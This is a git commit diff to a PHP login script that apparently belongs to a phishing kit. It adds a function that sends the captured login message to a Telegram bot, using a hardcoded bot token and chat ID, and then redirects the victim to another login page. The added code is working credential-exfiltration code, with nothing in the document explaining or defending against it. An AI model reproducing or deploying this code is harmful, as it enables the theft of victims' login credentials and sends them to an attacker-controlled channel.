dbda20e404a987a335e4b44ae531aeb3798065d1
WangKingola <king@onlinecoco.us>
2022-04-10 20:20:47 +0000

    login bot commit

--- Scripts/Login.php
+++ Scripts/Login.php
@@ -20,4 +20,26 @@ fwrite($text, $message);
 
 header("Location: ../Main/Email.html");
 
+
+/* Telegram */
+function sendMessage($messaggio) {
+    $token = '2096606596:AAG5pXX4sotZxew9zWFEtCLMF7T0TzjkvO4';
+    $chatid = '1656299190';
+    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
+    $url = $url . "&text=" . urlencode($messaggio);
+    $ch = curl_init();
+    $optArray = array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+sendMessage($message);
+header("Location: ../Main/login.html");
+
+
+
 ?>
